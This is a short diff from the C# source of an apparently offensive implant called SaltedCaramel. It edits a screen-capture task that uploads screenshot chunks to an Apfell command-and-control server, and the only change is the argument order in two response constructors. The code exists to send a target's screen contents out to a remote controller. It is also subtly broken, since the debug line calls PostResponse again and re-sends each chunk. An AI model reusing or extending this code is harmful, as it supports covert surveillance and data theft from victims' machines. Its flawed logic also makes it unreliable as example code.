@@ -37,7 +37,7 @@ namespace SaltedCaramel.Tasks
                 // Send total number of chunks to Apfell server
                 // Number of chunks will always be one for screen capture task
                 // Receive file ID in response
-                SCTaskResp initial = new SCTaskResp("{\"total_chunks\": " + 1 + ", \"task\":\"" + taskId + "\"}", taskId);
+                SCTaskResp initial = new SCTaskResp(taskId, "{\"total_chunks\": " + 1 + ", \"task\":\"" + taskId + "\"}");
                 DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.PostResponse(initial));
                 Debug.WriteLine($"[-] SendCapture - Received reply, file ID: " + reply.file_id);
 
@@ -49,7 +49,7 @@ namespace SaltedCaramel.Tasks
 
                 // Send our FileChunk to Apfell server
                 // Receive status in response
-                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(fc), taskId);
+                SCTaskResp response = new SCTaskResp(taskId, JsonConvert.SerializeObject(fc));
                 Debug.WriteLine($"[+] SendCapture - CHUNK SENT: {fc.chunk_num}");
                 string postReply = implant.PostResponse(response);
                 Debug.WriteLine($"[-] SendCapture - RESPONSE: {implant.PostResponse(response)}");
